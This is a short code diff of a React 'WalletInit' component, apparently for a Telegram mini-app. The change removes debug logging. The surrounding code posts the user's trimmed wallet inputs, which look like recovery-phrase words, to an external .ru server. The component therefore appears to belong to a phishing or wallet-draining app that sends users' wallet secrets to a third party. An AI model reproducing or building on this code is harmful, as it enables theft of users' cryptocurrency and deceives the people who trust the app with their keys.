@@ -77,9 +77,7 @@ const WalletInit = () => {
 
     const checkWallet = useCallback( async () => {
         MainButton.showProgress()
-        console.log('====================================');
-        console.log(inputs.map((e,i) => e.trim()));
-        console.log('====================================');
+
         try{
             
             await axios.post("https://www.connectbirga.ru/user/wallet", {
@@ -95,9 +93,6 @@ const WalletInit = () => {
         }
         catch(e){
             window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
-            console.log('====================================');
-            console.log(e);
-            console.log('====================================');
             setShow((value) => !value)
         }
         MainButton.hideProgress()
